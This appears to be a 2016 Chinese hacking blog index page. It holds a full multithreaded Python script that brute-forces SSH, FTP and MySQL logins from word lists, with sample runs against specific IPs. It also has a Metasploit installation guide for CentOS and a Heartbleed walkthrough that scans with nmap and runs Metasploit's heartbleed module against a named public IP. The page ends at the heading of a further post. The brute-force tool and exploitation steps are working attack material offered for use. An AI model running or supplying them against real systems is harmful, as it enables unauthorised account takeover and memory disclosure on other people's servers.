<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>dlam</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="春天的春，晴天的晴">
<meta property="og:type" content="website">
<meta property="og:title" content="dlam">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="dlam">
<meta property="og:description" content="春天的春，晴天的晴">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="dlam">
<meta name="twitter:description" content="春天的春，晴天的晴">
  
    <link rel="alternate" href="/atom.xml" title="dlam" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="index.html" id="logo">dlam</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="index.html">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="Flux RSS"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Rechercher"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-python之弱口令爆破" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/09/06/python之弱口令爆破/" class="article-date">
  <time datetime="2016-09-06T08:23:51.000Z" itemprop="datePublished">2016-09-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/python/">python</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/09/06/python之弱口令爆破/">python之弱口令爆破</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这个主要是参考代码，多线程密码爆破</p>
<p>#!/usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>‘this script can bruter ftp/ssh/mysql’</p>
<p><strong>author</strong> = ‘reber’</p>
<p>import Queue<br>import threading<br>import time<br>import logging<br>import socket<br>from optparse import OptionParser<br>import paramiko<br>from ftplib import FTP<br>import MySQLdb</p>
<p>#################公有类#################<br>class CommonFun(object):<br>    “””docstring for CommonFun”””<br>    def <strong>init</strong>(self):<br>        super(CommonFun, self).<strong>init</strong>()</p>
<pre><code>def set_log(self,lname):
    logger = logging.getLogger(lname)
    logger.setLevel(logging.DEBUG)

    ch = logging.StreamHandler()
    ch.setLevel(logging.DEBUG)

    formatter = logging.Formatter(&apos;%(asctime)s - %(name)s - %(levelname)s - %(message)s&apos;)
    ch.setFormatter(formatter)

    logger.addHandler(ch)

def show_log(self, lname, msg):
    a = logging.getLogger(lname)
    a.debug(msg)

def show_result(self, lname, rlist):
    if rlist:
        print &quot;###################################################################&quot;
        for x in rlist:
            self.show_log(lname,x)
    else:
        print &quot;not found...&quot;
</code></pre><p>#################SSH爆破模块#################<br>class SshBruter(CommonFun):<br>    “””docstring for SshBruter”””<br>    def <strong>init</strong>(self, *args):<br>        super(SshBruter, self).<strong>init</strong>()<br>        (options,arg) = args<br>        self.host = options.host<br>        self.userfile = options.userfile<br>        self.passfile = options.passfile<br>        self.threadnum = options.threadnum<br>        self.timeout = options.timeout<br>        self.result = []<br>        self.set_log(self.host)<br>        self.qlist = Queue.Queue()<br>        self.is_exit = False<br>        print self.host,self.userfile,self.passfile,self.threadnum</p>
<pre><code>def get_queue(self):
    with open(self.userfile, &apos;r&apos;) as f:
        ulines = f.readlines()
    with open(self.passfile, &apos;r&apos;) as f:
        plines = f.readlines()

    for name in ulines:
        for pwd in plines:
            name = name.strip()
            pwd = pwd.strip()
            self.qlist.put(name + &apos;:&apos; + pwd)

def thread(self):        
    while not self.qlist.empty():
        if not self.is_exit:
            name,pwd = self.qlist.get().split(&apos;:&apos;)
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
                time.sleep(0.05)
                ssh.close()
                s = &quot;[OK] %s:%s&quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&quot;Timeout...&quot;)
                self.qlist.put(name + &apos;:&apos; + pwd)
                time.sleep(3)
            except Exception, e:
                error = &quot;[Error] %s:%s&quot; % (name,pwd)
                self.show_log(self.host,error)
                pass
        else:
            break

def run(self):
    self.get_queue()
    starttime = time.time()

    threads = []
    for x in xrange(1,self.threadnum+1):
        t = threading.Thread(target=self.thread)
        threads.append(t)
        t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
        t.start()

    try:
        while True:
            if self.qlist.empty():
                break
            else:
                time.sleep(1)
    except KeyboardInterrupt:
        self.is_exit = True
        print &quot;Exit the program...&quot;
    print &quot;Waiting...&quot;
    time.sleep(5)

    self.show_result(self.host,self.result)
    finishetime = time.time()
    print &quot;Used time: %f&quot; % (finishetime-starttime)
</code></pre><p>#################FTP爆破模块#################<br>class FtpBruter(CommonFun):<br>    “””docstring for FtpBruter”””<br>    def <strong>init</strong>(self, *args):<br>        super(FtpBruter, self).<strong>init</strong>()<br>        (options,arg) = args<br>        self.host = options.host<br>        self.userfile = options.userfile<br>        self.passfile = options.passfile<br>        self.threadnum = options.threadnum<br>        self.timeout = options.timeout<br>        self.result = []<br>        self.set_log(self.host)<br>        self.qlist = Queue.Queue()<br>        print self.host,self.userfile,self.passfile,self.threadnum</p>
<pre><code>def get_queue(self):
    with open(self.userfile, &apos;r&apos;) as f:
        ulines = f.readlines()
    with open(self.passfile, &apos;r&apos;) as f:
        plines = f.readlines()

    for name in ulines:
        for pwd in plines:
            name = name.strip()
            pwd = pwd.strip()
            self.qlist.put(name + &apos;:&apos; + pwd)

def thread(self):
    while not self.qlist.empty():
        name,pwd = self.qlist.get().split(&apos;:&apos;)
        try:
            ftp = FTP()
            ftp.connect(self.host, 21, self.timeout)
            ftp.login(name, pwd)
            time.sleep(0.05)
            ftp.quit()
            s = &quot;[OK] %s:%s&quot; % (name,pwd)
            self.show_log(self.host,s)
            self.result.append(s)
        except socket.timeout:
            self.show_log(self.host,&quot;Timeout...&quot;)
            self.qlist.put(name + &apos;:&apos; + pwd)
            time.sleep(1)
        except Exception, e:
            error = &quot;[Error] %s:%s&quot; % (name,pwd)
            self.show_log(self.host,error)
            pass

def run(self):
    self.get_queue()
    starttime = time.time()

    threads = []
    for x in xrange(1,self.threadnum+1):
        t = threading.Thread(target=self.thread)
        threads.append(t)
        t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
        t.start()

    try:
        while True:
            if self.qlist.empty():
                break
            else:
                time.sleep(1)
    except KeyboardInterrupt:
        self.is_exit = True
        print &quot;Exit the program...&quot;
    print &quot;Waiting...&quot;
    time.sleep(5)

    self.show_result(self.host,self.result)
    finishetime = time.time()
    print &quot;Used time: %f&quot; % (finishetime-starttime)
</code></pre><p>#################MySQL爆破模块#################<br>class MysqlBruter(CommonFun):<br>    “””docstring for MysqlBruter”””<br>    def <strong>init</strong>(self, *args):<br>        super(MysqlBruter, self).<strong>init</strong>()<br>        (options,arg) = args<br>        self.host = options.host<br>        self.userfile = options.userfile<br>        self.passfile = options.passfile<br>        self.threadnum = options.threadnum<br>        self.timeout = options.timeout<br>        self.result = []<br>        self.set_log(self.host)<br>        self.qlist = Queue.Queue()<br>        print self.host,self.userfile,self.passfile,self.threadnum</p>
<pre><code>def get_queue(self):
    with open(self.userfile, &apos;r&apos;) as f:
        ulines = f.readlines()
    with open(self.passfile, &apos;r&apos;) as f:
        plines = f.readlines()

    for name in ulines:
        for pwd in plines:
            name = name.strip()
            pwd = pwd.strip()
            self.qlist.put(name + &apos;:&apos; + pwd)

def thread(self):
    while not self.qlist.empty():
        name,pwd = self.qlist.get().split(&apos;:&apos;)
        try:
            conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db=&apos;mysql&apos;, port=3306)
            if conn:
                # time.sleep(0.05)
                conn.close()
            s = &quot;[OK] %s:%s&quot; % (name,pwd)
            self.show_log(self.host,s)
            self.result.append(s)
        except socket.timeout:
            self.show_log(self.host,&quot;Timeout&quot;)
            self.qlist.put(name + &apos;:&apos; + pwd)
            time.sleep(3)
        except Exception, e:
            error = &quot;[Error] %s:%s&quot; % (name,pwd)
            self.show_log(self.host,error)
            pass

def run(self):
    self.get_queue()
    starttime = time.time()

    threads = []
    for x in xrange(1,self.threadnum+1):
        t = threading.Thread(target=self.thread)
        threads.append(t)
        t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
        t.start()

    try:
        while True:
            if self.qlist.empty():
                break
            else:
                time.sleep(1)
    except KeyboardInterrupt:
        self.is_exit = True
        print &quot;Exit the program...&quot;
    print &quot;Waiting...&quot;
    time.sleep(5)

    self.show_result(self.host,self.result)
    finishetime = time.time()
    print &quot;Used time: %f&quot; % (finishetime-starttime)
</code></pre><p>def main():<br>    parser = OptionParser(usage=’Usage: python %prog [options] type’)<br>    parser.add_option(‘-i’,’–host’,dest=’host’,help=’target ip’)<br>    parser.add_option(‘-o’,’–timeout’,type=int,dest=’timeout’,default=5,help=’timeout’)<br>    parser.add_option(‘-t’,’–thread’,type=int,dest=’threadnum’,default=10,help=’threadnum’)<br>    parser.add_option(‘-L’,’–userfile’,dest=’userfile’,default=’username.txt’,help=’userfile’)<br>    parser.add_option(‘-P’,’–passfile’,dest=’passfile’,default=’password.txt’,help=’passfile’)</p>
<pre><code>(options, args) = parser.parse_args()

if not args:
    parser.print_help()
    exit()

if args[0]==&apos;ssh&apos;:
    if options.host:
        ssh = SshBruter(options, args)
        ssh.run()
    else:
        parser.print_help()
elif args[0]==&apos;ftp&apos;:
    if options.host:
        ftp = FtpBruter(options, args)
        ftp.run()
    else:
        parser.print_help()
elif args[0]==&apos;mysql&apos;:
    if options.host:
        mysql = MysqlBruter(options, args)
        mysql.run()
    else:
        parser.print_help()
else:
    print &quot;type must be ssh or ftp or mysql&quot;
</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    main()</p>
<p>具体操作如下：<br>[root@VM_201_177_centos python]# python weakkey.py<br>Usage: python weakkey.py [options] type</p>
<p>Options:<br>  -h, –help            show this help message and exit<br>  -i HOST, –host=HOST  target ip<br>  -o TIMEOUT, –timeout=TIMEOUT<br>                        timeout<br>  -t THREADNUM, –thread=THREADNUM<br>                        threadnum<br>  -L USERFILE, –userfile=USERFILE<br>                        userfile<br>  -P PASSFILE, –passfile=PASSFILE<br>                        passfile</p>
<p>[root@VM_201_177_centos python]# python weakkey.py -i 115.159.215.14 -t 10 ssh 115.159.215.14 username.txt  password.txt<br>115.159.215.14 username.txt password.txt 10<br>No handlers could be found for logger “paramiko.transport”<br>2016-09-06 16:54:59,332 - 115.159.215.14 - DEBUG - [Error] 123456:123456<br>2016-09-06 16:54:59,683 - 115.159.215.14 - DEBUG - [Error] root:123456<br>2016-09-06 16:54:59,694 - 115.159.215.14 - DEBUG - [Error] 123456:root<br>2016-09-06 16:54:59,702 - 115.159.215.14 - DEBUG - [Error] admin:123456<br>2016-09-06 16:54:59,704 - 115.159.215.14 - DEBUG - [Error] admin:root</p>
<p>[root@VM_201_177_centos python]# python weakkey.py -i 10.22.100.88 -t 10 ftp 10.22.100.88 username.txt  password.txt 10<br>10.22.100.88 username.txt password.txt 10<br>2016-09-06 17:05:42,440 - 10.22.100.88 - DEBUG - Timeout…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/09/06/python之弱口令爆破/" data-id="cisvif0u80010lohrw2qpn8tl" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/09/06/python之弱口令爆破/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/ssh密码爆破/">ssh密码爆破</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-centos6-5安装metasploit" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/19/centos6-5安装metasploit/" class="article-date">
  <time datetime="2016-08-19T07:48:45.000Z" itemprop="datePublished">2016-08-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/19/centos6-5安装metasploit/">centos6.5安装metasploit</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Metasploit是一款强大的开源安全检测工具，攻击渗透功能十分强大，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估， 提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程。<br>安装环境：<br>  centos6.5<br>查看系统版本：<br>[root@VM_117_255_centos ~]# uname -a<br>Linux VM_117_255_centos 2.6.32-504.30.3.el6.x86_64 #1 SMP Wed Jul 15 10:13:09 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</p>
<h2 id="【详细安装流程】"><a href="#【详细安装流程】" class="headerlink" title="【详细安装流程】"></a>【详细安装流程】</h2><p>1.更新yum源，安装metasploit需要安装一系列的依赖包，更新yum源<br>[root@VM_117_255_centos ~]# yum update<br>2.安装开发环境依赖包，理由同上：<br>[root@VM_117_255_centos ~]# yum groupinstall ‘development tools’<br>3.安装msf所需要的开发工具依赖包<br>[root@VM_9_220_centos ~]#yum install sqlite-devel libxslt-devel<br>libxml2-devel java-1.7.0-openjdk libpcap-devel nano openssl-devel<br>zlib-devel libffi-devel gdbm-devel readline-devel nano wget<br>上述依赖包以及开发工具安装完成之后接下来就需要安装 ruby 环境，<br>因为新版本的 metasploit 开发人员是用 ruby 写的，最开始的时候 metasploit<br>是用 perl 脚本语言写的，一直到 2006 年的 2.7 版本一直都还是使用 perl 语言<br>编写的，后来开发人员发现 perl 存在一些缺陷，所以在 2007 年底使用 ruby 语<br>言重写了 metasploit 的框架。</p>
<h2 id="二、相关组件安装"><a href="#二、相关组件安装" class="headerlink" title="二、相关组件安装"></a>二、相关组件安装</h2><p>1.RVM安装<br>安装ruby之前先安装一下ruby的管理工具RVM,个人推荐安装ruby使用方便，使用curl下载rvm<br>[root@VM_117_255_centos ~]# curl -L get.rvm.io | bash -s stable<br>需要下载一个验证码之类的东西，下载之后在执行rvm<br>[root@VM_117_255_centos ~]# curl -sSL <a href="https://rvm.io/mpapis.asc" target="_blank" rel="external">https://rvm.io/mpapis.asc</a> | gpg2 –import -<br>[root@VM_117_255_centos ~]# curl -L get.rvm.io | bash -s stable<br>出现Think you for using RVM！证明安装完成了<br>使用rvm的配置文件，使其生效<br>[root@VM_117_255_centos ~]# find / -name rvm.sh<br>[root@VM_117_255_centos ~]# source /etc/profile.d/rvm.sh<br>[root@VM_117_255_centos ~]# rvm<br>其实到这里已经可以使用 rvm 进行 ruby 的安装及使用了， 为了后续的完美使用，<br>我们现在装一下 rvm 所需要的一些依赖：<br>[root@VM_117_255_centos ~]# rvm requirements<br>Checking requirements for centos.<br>Installing requirements for centos.<br>Installing required packages: libyaml-devel……<br>Requirements installation successful.<br>[root@VM_117_255_centos ~]# rvmsudo yum install -y gcc-c++ patch readline  readline-devel zlib zlib-devel libyaml-devel libffi-devel openssl-devel  make bzip2 autoconf automake libtool bison iconv-devel<br>[root@VM_117_255_centos ~]# rvm requirements<br>Checking requirements for centos.<br>Requirements installation successful.<br>上述rvm已经安装成功<br>2、yaml安装<br>后续的一些组件在安装的时候需要源码安装，所以源码安装之前先安装yaml，yaml是表达资料序列的编程语言</p>
<p>[root@VM_117_255_centos ~]# cd /usr/src/<br>[root@VM_117_255_centos src]# wget <a href="http://pyyaml.org/download/libyaml/yaml-0.1.6.tar.gz" target="_blank" rel="external">http://pyyaml.org/download/libyaml/yaml-0.1.6.tar.gz</a></p>
<p>[root@VM_117_255_centos src]# tar -zxvf yaml-0.1.6.tar.gz<br> [root@VM_117_255_centos src]# rm -rf yaml-0.1.6.tar.gz<br> [root@VM_117_255_centos src]# cd yaml-0.1.6/<br>[root@VM_117_255_centos yaml-0.1.6]# ./configure –prefix=/usr/local<br>[root@VM_117_255_centos yaml-0.1.6]# make                                 编译<br> [root@VM_117_255_centos yaml-0.1.6]# make install                       安装<br>[root@VM_117_255_centos yaml-0.1.6]# make clean                          清除缓存文件</p>
<h2 id="三、安装nmap"><a href="#三、安装nmap" class="headerlink" title="三、安装nmap"></a>三、安装nmap</h2><p>据说 metasploit 中没有 nmap 那就安装一下吧，namp 是一款强大的端口扫描工具，在渗透测<br>试过程中，情报收集阶段利用非常方便：<br>会在当前目录下，增加一个 nmap 文件夹； svn 的 namp 文件的内容，在 nmap<br>文件夹中<br>[root@VM_117_255_centos yaml-0.1.6]# svn co <a href="https://svn.nmap.org/nmap" target="_blank" rel="external">https://svn.nmap.org/nmap</a><br>[root@VM_117_255_centos yaml-0.1.6]# cd nmap<br>[root@VM_117_255_centos nmap]# ./configure<br> root@VM_117_255_centos nmap]# make<br>[root@VM_117_255_centos nmap]# make install<br>[root@VM_117_255_centos nmap]# make clean</p>
<h2 id="四、安装ruby"><a href="#四、安装ruby" class="headerlink" title="四、安装ruby"></a>四、安装ruby</h2><p>Ruby 是一种面向对象、命令式、函数式、动态的通用编程语言<br>先查看一下安装的有没有 ruby 版本：<br>[root@VM_117_255_centos yaml-0.1.6]# rvm list<br>安装最新版本的 ruby,metasploit 貌似对 ruby 版本还有要求，网上说的是不能<br>低于 1.9.2，不管这些，安装最新版本的就对了：<br>[root@VM_117_255_centos yaml-0.1.6]# rvm install ruby-2.3.1<br>[root@VM_117_255_centos yaml-0.1.6]# rvm list</p>
<h2 id="五、安装postgresql"><a href="#五、安装postgresql" class="headerlink" title="五、安装postgresql"></a>五、安装postgresql</h2><p>msf 使用的是 postgrepsql server 的数据管理库， PostgreSQL 是一个自由的<br>对象-关系数据库服务器(数据库管理系统)<br>首先修改一下配置文件：<br>[root@VM_117_255_centos yaml-0.1.6]# vim /etc/yum.repos.d/CentOS-Base.repo<br>添加内容：exclude=postgresql*<br>接下来下载安装：<br>[root@VM_117_255_centos src]# wget <a href="http://yum.postgresql.org/9.2/redhat/rhel-6-x86_64/pgdg-centos92-9.2-6.noarch.rpm" target="_blank" rel="external">http://yum.postgresql.org/9.2/redhat/rhel-6-x86_64/pgdg-centos92-9.2-6.noarch.rpm</a><br>[root@VM_117_255_centos src]# rpm -ivh pgdg-centos92-9.2-6.noarch.rpm<br>更新一下安装包<br>[root@VM_117_255_centos src]# yum update<br>[root@VM_117_255_centos src]#  yum install postgresql92-server postgresql92-devel postgresql92<br>将安装好的 postgresql 数据库进行配置：<br>[root@VM_117_255_centos src]#  service postgresql-9.2 initdb    初始化数据库<br>Initializing database:                                     [  OK  ]<br>[root@VM_117_255_centos src]#  service postgresql-9.2 start       开启服务<br>Starting postgresql-9.2 service:                           [  OK  ]<br>[root@VM_117_255_centos src]#  chkconfig postgresql-9.2 on   开机自启动<br> [root@VM_117_255_centos src]# echo export  PATH=/usr/pgsql-9.2/bin:\$PATH &gt;&gt; /etc/bashrc<br>[root@VM_117_255_centos src]#  source ~/.bashrc<br>给 postgresql 数据库创建用户，设置密码：<br>[root@VM_117_255_centos src]# su - postgres<br>-bash-4.1$ createuser msf -P -S -R -D<br>Enter password for new role:<br>Enter it again:<br>-bash-4.1$ createdb -O msf msf<br>-bash-4.1$ exit<br>管理数据库的配置文件<br>[root@VM_117_255_centos src]#  vim /var/lib/pgsql/9.2/data/pg_hba.conf<br>local msf msf md5<br>host msf msf 127.0.0.1/8 md5<br>host msf msf ::1/128 md5<br>修改完配置文件，重启一下服务：<br>[root@VM_117_255_centos src]#  service postgresql-9.2 start<br>Starting postgresql-9.2 service:                           [  OK  ]</p>
<h2 id="六、安装metasploit"><a href="#六、安装metasploit" class="headerlink" title="六、安装metasploit"></a>六、安装metasploit</h2><p>首先安装 msf 所需要的 ruby 库<br>[root@VM_117_255_centos src]# gem install wirble pg sqlite3 msgpack activerecord redcarpet rspec simplecov yard bundler<br>下载 metasploit 框架，将其放到 opt 目录下：<br>[root@VM_117_255_centos opt]# git clone <a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework.git</a><br>下载很慢很慢很慢，你们要准备好等待。。。。。<br>[root@VM_117_255_centos opt]# ls<br>metasploit-framework  rh<br>[root@VM_117_255_centos opt]# cd metasploit-framework/<br>编辑 msf 的数据库配置文件，使 msf 启动的时候能够加载数据库<br>[root@VM_117_255_centos metasploit-framework]# bundle install<br>[root@VM_117_255_centos metasploit-framework]# nano /opt/metasploit-framework/database.yml<br>写入的内容：<br>production:<br>adapter: postgresql<br>database: msf<br>username: msf<br>password: 111111<br>host: 127.0.0.1<br>port: 5432<br>pool: 75<br>timeout: 5<br>按ctrl+x 然后按下确定键<br>添加环境变量使其生效<br>[root@VM_117_255_centos metasploit-framework]#  echo export  MSF_DATABASE_CONFIG=/opt/metasploit-framework/database.yml &gt;&gt;  /etc/bashrc<br>[root@VM_117_255_centos metasploit-framework]#  source ~/.bashrc<br>[root@VM_117_255_centos metasploit-framework]# ./msfconsole<br>[root@VM_117_255_centos metasploit-framework]# service postgresql-9.2 restart<br>Stopping postgresql-9.2 service:                           [  OK  ]<br>Starting postgresql-9.2 service:                           [  OK  ]</p>
<h2 id="数据库连接问题"><a href="#数据库连接问题" class="headerlink" title="数据库连接问题"></a>数据库连接问题</h2><p>如果数据库连接不上有以下几种解决方法：<br>1.进入msf之后<br>msf &gt; db_status<br>[<em>] postgresql selected, no connection<br>msf &gt; db_connect msf:111111@localhost/msf<br>[</em>] Rebuilding the module cache in the background…<br>msf &gt; db_status<br>[*] postgresql connected to msf<br>2.如果还连接不上就查看一下配置文件<br>oot@VM_117_255_centos metasploit-framework]# nano /opt/metasploit-framework/database.yml<br>3.如果不行就可以创建一个用户<br>启动postgresql 服务:<br>service postgresql start<br>进入 postgres:<br>su postgres<br>输入如下命令创建一个postgresql数据库账户:<br>createuser msf3 –P<br>命令中的msf3就是要创建的用户，当然你可以输入任何其他用户名。<br>接着，终端中会提示你输入密码，然后确认密码，这里我设置密码为“msf3”。<br>然后询问你该账户的权限，输入y或者n都无所谓。<br>创建数据库:<br>createdb –owner=msf3 msf3<br>owner参数指定数据库的所有者，这里为msf3，最后一个参数为数据库名称，这里也设置为msf3。<br>输入exit退出当前用户，回到root上下文中。回到手动连接的步骤:<br>root@kali: msfconsole<br>msf &gt; db_connect msf3:msf3@localhost/msf3<br>这也是kali第一次启动数据库连接不上可以解决</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/19/centos6-5安装metasploit/" data-id="cisvif0sk000alohrkxs2upvh" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/19/centos6-5安装metasploit/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/metasploit/">metasploit</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-openssl心脏滴血漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/18/openssl心脏滴血漏洞/" class="article-date">
  <time datetime="2016-08-18T12:03:36.000Z" itemprop="datePublished">2016-08-18</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2016/08/18/openssl心脏滴血漏洞/">openssl心脏滴血漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/14/1.png?raw=true" alt="image"><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/14/2.png?raw=true" alt="image"><br>64kb导致溢出</p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>检测是否存在心脏滴血漏洞</strong></p>
<ul>
<li>首先安装两个依赖包<br>非常实用的hack工具组合，首先得升级msfconsole至最新版，然后给nmap添加一个针对heartbleed的扫描脚本，用来发现心脏出血漏洞：<br>cd /usr/share/nmap/scripts/<br>wget <a href="https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse" target="_blank" rel="external">https://svn.nmap.org/nmap/scripts/ssl-heartbleed.nse</a><br>cd /usr/share/nmap/nselib/<br>wget <a href="https://svn.nmap.org/nmap/nselib/tls.lua" target="_blank" rel="external">https://svn.nmap.org/nmap/nselib/tls.lua</a><br>nmap –script-updatedb<br>添加成功之后扫描一个没有更新openssl的网站：<br>nmap -n -p 443 -Pn –script=ssl-heartbleed servers_ip<br>出现如下漏洞信息：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">Nmap scan report for xxx.yyy (xxx_ip)</div><div class="line">Host is up (0.071s latency).</div><div class="line">PORT    STATE SERVICE</div><div class="line">443/tcp open  https</div><div class="line">| ssl-heartbleed:</div><div class="line">|   VULNERABLE:</div><div class="line">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</div><div class="line">|     State: VULNERABLE</div><div class="line">|     Risk factor: High</div><div class="line">|     Description:</div><div class="line">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</div><div class="line">|           </div><div class="line">|     References:</div><div class="line">|       http://cvedetails.com/cve/2014-0160/</div><div class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</div><div class="line">|_      http://www.openssl.org/news/secadv_20140407.txt</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">然后msfconsole载入 auxiliary/scanner/ssl/openssl_heartbleed 模块：</div><div class="line">msf &gt; use auxiliary/scanner/ssl/openssl_heartbleedset RHOSTS xxx_ipset RPORT 443set VERBOSE trueexploit</div><div class="line">进入msfconsole</div><div class="line">msf &gt; use auxiliary/scanner/ssl/openssl_heartbleed</div><div class="line"> msf auxiliary(openssl_heartbleed) &gt; show options</div><div class="line"> msf auxiliary(openssl_heartbleed) &gt; set r</div><div class="line">set response_timeout  set rhosts            set rport</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set r</div><div class="line">set response_timeout  set rhosts            set rport</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set rhosts 115.28.100.222</div><div class="line">rhosts =&gt; 115.28.100.222</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set rport 443</div><div class="line">rport =&gt; 443</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; set verbose true</div><div class="line">verbose =&gt; true</div><div class="line">msf auxiliary(openssl_heartbleed) &gt; exploit</div><div class="line">115.28.100.222:8080/pyadmin</div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/" data-id="cisvif0zi003qlohr6g340duo" class="article-share-link">Partager</a>
      
        <a href="http://yoursite.com/2016/08/18/openssl心脏滴血漏洞/#disqus_thread" class="article-comment-link">Commentaires</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="tags/openssl/">openssl</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-文件上传之解析漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2016/08/11/文件上传之解析漏洞/" class="article-date">
  <time datetime="2016-08-11T11:14:21.000Z" itemprop="datePublished">2016-08-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
